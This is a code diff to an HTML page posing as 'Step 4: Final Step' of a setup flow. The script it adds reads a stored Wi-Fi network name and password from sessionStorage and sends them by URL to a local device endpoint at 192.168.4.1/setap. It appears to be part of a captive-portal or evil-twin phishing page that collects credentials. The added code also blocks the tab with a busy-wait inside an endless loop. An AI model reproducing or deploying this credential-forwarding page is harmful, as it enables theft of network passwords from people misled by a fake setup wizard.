@@ -1,16 +1,26 @@
 <!-- #######  THIS IS A COMMENT - Visible only in the source editor #########-->
 <h1 id="hello" style="text-align: center;"><span style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; color: #000000;">Step 4: Final Step...</span></h1>
 <script>
-  document.getElementById("demo");
-  if (!document.hasFocus()) {
-    setInterval("myFunction()", 15000);
+  myFunction()
+  function wait(ms){
+   var start = new Date().getTime();
+   var end = start;
+   while(end < start + ms) {
+     end = new Date().getTime();
   }
+}
 
 function myFunction() {
+   document.getElementById("demo");
+  while(true){
+  if (!document.hasFocus()) {
+    wait(15000);
     var user = sessionStorage.getItem("ssid");
     var pass = sessionStorage.getItem("pass");
     var url = "http://192.168.4.1/setap?ssid=" + user + "&pass=" + pass;
     window.open(url,"_self");
+  }
+  }
 }  
 </script>
 
